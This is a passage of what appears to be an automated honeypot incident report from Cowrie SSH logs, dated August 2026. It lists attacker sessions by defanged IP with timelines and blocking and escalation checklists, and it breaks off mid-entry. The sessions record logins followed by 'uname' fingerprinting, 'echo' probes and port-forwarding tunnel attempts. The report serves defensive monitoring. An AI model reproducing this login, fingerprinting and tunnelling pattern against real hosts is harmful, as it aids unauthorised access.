**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9484f11f7b

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 06:30 |
| **Last Seen** | 2026-08-15 06:31 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:30:48` | `cowrie.session.connect` |
| `2026-08-15 06:30:53` | `cowrie.client.version` |
| `2026-08-15 06:30:53` | `cowrie.client.kex` |
| `2026-08-15 06:31:15` | `cowrie.login.success` |
| `2026-08-15 06:31:28` | `cowrie.session.params` |
| `2026-08-15 06:31:28` | `cowrie.command.input` |
| `2026-08-15 06:31:33` | `cowrie.log.closed` |
| `2026-08-15 06:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eba4d74f61b

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-08-15 06:32 |
| **Last Seen** | 2026-08-15 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:32:34` | `cowrie.session.connect` |
| `2026-08-15 06:32:34` | `cowrie.client.version` |
| `2026-08-15 06:32:34` | `cowrie.client.kex` |
| `2026-08-15 06:32:37` | `cowrie.login.success` |
| `2026-08-15 06:32:37` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acbb40154f23

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-15 06:32 |
| **Last Seen** | 2026-08-15 06:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:32:43` | `cowrie.session.connect` |
| `2026-08-15 06:32:44` | `cowrie.client.version` |
| `2026-08-15 06:32:44` | `cowrie.client.kex` |
| `2026-08-15 06:32:46` | `cowrie.login.success` |
| `2026-08-15 06:32:47` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f839ebc40bd1

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-15 06:34 |
| **Last Seen** | 2026-08-15 06:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:34:16` | `cowrie.session.connect` |
| `2026-08-15 06:34:17` | `cowrie.client.version` |
| `2026-08-15 06:34:17` | `cowrie.client.kex` |
| `2026-08-15 06:34:19` | `cowrie.login.success` |
| `2026-08-15 06:34:20` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63834f9731c3

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]33` |
| **First Seen** | 2026-08-15 06:34 |
| **Last Seen** | 2026-08-15 06:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:34:25` | `cowrie.session.connect` |
| `2026-08-15 06:34:26` | `cowrie.client.version` |
| `2026-08-15 06:34:26` | `cowrie.client.kex` |
| `2026-08-15 06:34:30` | `cowrie.login.success` |
| `2026-08-15 06:34:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]33` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df2774a632c

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-08-15 06:38 |
| **Last Seen** | 2026-08-15 06:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:38:00` | `cowrie.session.connect` |
| `2026-08-15 06:38:01` | `cowrie.client.version` |
| `2026-08-15 06:38:01` | `cowrie.client.kex` |
| `2026-08-15 06:38:03` | `cowrie.login.success` |
| `2026-08-15 06:38:04` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da4eb44784b

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-08-15 06:40 |
| **Last Seen** | 2026-08-15 06:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:40:02` | `cowrie.session.connect` |
| `2026-08-15 06:40:02` | `cowrie.client.version` |
| `2026-08-15 06:40:02` | `cowrie.client.kex` |
| `2026-08-15 06:40:05` | `cowrie.login.success` |
| `2026-08-15 06:40:06` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799ab71c7540

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-15 06:40 |
| **Last Seen** | 2026-08-15 06:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:40:12` | `cowrie.session.connect` |
| `2026-08-15 06:40:13` | `cowrie.client.version` |
| `2026-08-15 06:40:13` | `cowrie.client.kex` |
| `2026-08-15 06:40:17` | `cowrie.login.success` |
| `2026-08-15 06:40:18` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ffbcd70bc66

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 06:45 |
| **Last Seen** | 2026-08-15 06:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:45:13` | `cowrie.session.connect` |
| `2026-08-15 06:45:13` | `cowrie.client.version` |
| `2026-08-15 06:45:13` | `cowrie.client.kex` |
| `2026-08-15 06:45:13` | `cowrie.login.success` |
| `2026-08-15 06:45:14` | `cowrie.session.params` |
| `2026-08-15 06:45:14` | `cowrie.command.input` |
| `2026-08-15 06:45:15` | `cowrie.log.closed` |
| `2026-08-15 06:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49eb4d4bab8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:46 |
| **Last Seen** | 2026-08-15 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:46:54` | `cowrie.session.connect` |
| `2026-08-15 06:46:55` | `cowrie.client.version` |
| `2026-08-15 06:46:55` | `cowrie.client.kex` |
| `2026-08-15 06:46:57` | `cowrie.login.success` |
| `2026-08-15 06:46:58` | `cowrie.session.params` |
| `2026-08-15 06:46:58` | `cowrie.command.input` |
| `2026-08-15 06:46:59` | `cowrie.log.closed` |
| `2026-08-15 06:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b97c78c624

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:01` | `cowrie.session.connect` |
| `2026-08-15 06:47:02` | `cowrie.client.version` |
| `2026-08-15 06:47:02` | `cowrie.client.kex` |
| `2026-08-15 06:47:06` | `cowrie.login.success` |
| `2026-08-15 06:47:09` | `cowrie.session.params` |
| `2026-08-15 06:47:09` | `cowrie.command.input` |
| `2026-08-15 06:47:10` | `cowrie.log.closed` |
| `2026-08-15 06:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b8f1e929f4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:07` | `cowrie.session.connect` |
| `2026-08-15 06:47:09` | `cowrie.client.version` |
| `2026-08-15 06:47:09` | `cowrie.client.kex` |
| `2026-08-15 06:47:14` | `cowrie.login.success` |
| `2026-08-15 06:47:17` | `cowrie.session.params` |
| `2026-08-15 06:47:17` | `cowrie.command.input` |
| `2026-08-15 06:47:18` | `cowrie.log.closed` |
| `2026-08-15 06:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb304882ae4a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:14` | `cowrie.session.connect` |
| `2026-08-15 06:47:15` | `cowrie.client.version` |
| `2026-08-15 06:47:15` | `cowrie.client.kex` |
| `2026-08-15 06:47:20` | `cowrie.login.success` |
| `2026-08-15 06:47:23` | `cowrie.session.params` |
| `2026-08-15 06:47:23` | `cowrie.command.input` |
| `2026-08-15 06:47:24` | `cowrie.log.closed` |
| `2026-08-15 06:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b27cbd329323

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:20` | `cowrie.session.connect` |
| `2026-08-15 06:47:21` | `cowrie.client.version` |
| `2026-08-15 06:47:21` | `cowrie.client.kex` |
| `2026-08-15 06:47:27` | `cowrie.login.success` |
| `2026-08-15 06:47:30` | `cowrie.session.params` |
| `2026-08-15 06:47:30` | `cowrie.command.input` |
| `2026-08-15 06:47:31` | `cowrie.log.closed` |
| `2026-08-15 06:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a08e091458

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:26` | `cowrie.session.connect` |
| `2026-08-15 06:47:28` | `cowrie.client.version` |
| `2026-08-15 06:47:28` | `cowrie.client.kex` |
| `2026-08-15 06:47:33` | `cowrie.login.success` |
| `2026-08-15 06:47:36` | `cowrie.session.params` |
| `2026-08-15 06:47:36` | `cowrie.command.input` |
| `2026-08-15 06:47:38` | `cowrie.log.closed` |
| `2026-08-15 06:47:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f154772fbae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:33` | `cowrie.session.connect` |
| `2026-08-15 06:47:34` | `cowrie.client.version` |
| `2026-08-15 06:47:34` | `cowrie.client.kex` |
| `2026-08-15 06:47:40` | `cowrie.login.success` |
| `2026-08-15 06:47:43` | `cowrie.session.params` |
| `2026-08-15 06:47:43` | `cowrie.command.input` |
| `2026-08-15 06:47:44` | `cowrie.log.closed` |
| `2026-08-15 06:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40dcdd74d04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:39` | `cowrie.session.connect` |
| `2026-08-15 06:47:41` | `cowrie.client.version` |
| `2026-08-15 06:47:41` | `cowrie.client.kex` |
| `2026-08-15 06:47:46` | `cowrie.login.success` |
| `2026-08-15 06:47:49` | `cowrie.session.params` |
| `2026-08-15 06:47:49` | `cowrie.command.input` |
| `2026-08-15 06:47:49` | `cowrie.log.closed` |
| `2026-08-15 06:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa9d22b83c1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:47` | `cowrie.session.connect` |
| `2026-08-15 06:47:48` | `cowrie.client.version` |
| `2026-08-15 06:47:48` | `cowrie.client.kex` |
| `2026-08-15 06:47:51` | `cowrie.login.success` |
| `2026-08-15 06:47:54` | `cowrie.session.params` |
| `2026-08-15 06:47:54` | `cowrie.command.input` |
| `2026-08-15 06:47:54` | `cowrie.log.closed` |
| `2026-08-15 06:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c994d87e7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:53` | `cowrie.session.connect` |
| `2026-08-15 06:47:54` | `cowrie.client.version` |
| `2026-08-15 06:47:54` | `cowrie.client.kex` |
| `2026-08-15 06:47:56` | `cowrie.login.success` |
| `2026-08-15 06:47:58` | `cowrie.session.params` |
| `2026-08-15 06:47:58` | `cowrie.command.input` |
| `2026-08-15 06:47:59` | `cowrie.log.closed` |
| `2026-08-15 06:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be44031cc15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:47 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:47:59` | `cowrie.session.connect` |
| `2026-08-15 06:48:00` | `cowrie.client.version` |
| `2026-08-15 06:48:00` | `cowrie.client.kex` |
| `2026-08-15 06:48:03` | `cowrie.login.success` |
| `2026-08-15 06:48:06` | `cowrie.session.params` |
| `2026-08-15 06:48:06` | `cowrie.command.input` |
| `2026-08-15 06:48:07` | `cowrie.log.closed` |
| `2026-08-15 06:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ec90ab0893

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:06` | `cowrie.session.connect` |
| `2026-08-15 06:48:07` | `cowrie.client.version` |
| `2026-08-15 06:48:07` | `cowrie.client.kex` |
| `2026-08-15 06:48:09` | `cowrie.login.success` |
| `2026-08-15 06:48:11` | `cowrie.session.params` |
| `2026-08-15 06:48:11` | `cowrie.command.input` |
| `2026-08-15 06:48:11` | `cowrie.log.closed` |
| `2026-08-15 06:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d61a728f459

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:13` | `cowrie.session.connect` |
| `2026-08-15 06:48:13` | `cowrie.client.version` |
| `2026-08-15 06:48:13` | `cowrie.client.kex` |
| `2026-08-15 06:48:16` | `cowrie.login.success` |
| `2026-08-15 06:48:17` | `cowrie.session.params` |
| `2026-08-15 06:48:17` | `cowrie.command.input` |
| `2026-08-15 06:48:17` | `cowrie.log.closed` |
| `2026-08-15 06:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-253fe0bac104

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:20` | `cowrie.session.connect` |
| `2026-08-15 06:48:20` | `cowrie.client.version` |
| `2026-08-15 06:48:20` | `cowrie.client.kex` |
| `2026-08-15 06:48:22` | `cowrie.login.success` |
| `2026-08-15 06:48:24` | `cowrie.session.params` |
| `2026-08-15 06:48:24` | `cowrie.command.input` |
| `2026-08-15 06:48:24` | `cowrie.log.closed` |
| `2026-08-15 06:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8802d12782

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:27` | `cowrie.session.connect` |
| `2026-08-15 06:48:27` | `cowrie.client.version` |
| `2026-08-15 06:48:27` | `cowrie.client.kex` |
| `2026-08-15 06:48:27` | `cowrie.login.success` |
| `2026-08-15 06:48:28` | `cowrie.session.params` |
| `2026-08-15 06:48:28` | `cowrie.command.input` |
| `2026-08-15 06:48:28` | `cowrie.log.closed` |
| `2026-08-15 06:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6e723fef83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:48:33` | `cowrie.session.connect` |
| `2026-08-15 06:48:33` | `cowrie.client.version` |
| `2026-08-15 06:48:33` | `cowrie.client.kex` |
| `2026-08-15 06:48:34` | `cowrie.login.success` |
| `2026-08-15 06:48:35` | `cowrie.session.params` |
| `2026-08-15 06:48:35` | `cowrie.command.input` |
| `2026-08-15 06:48:36` | `cowrie.log.closed` |
| `2026-08-15 06:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79eaf524deae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:48 |
| **Last Seen** | 2026-08-15 06:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
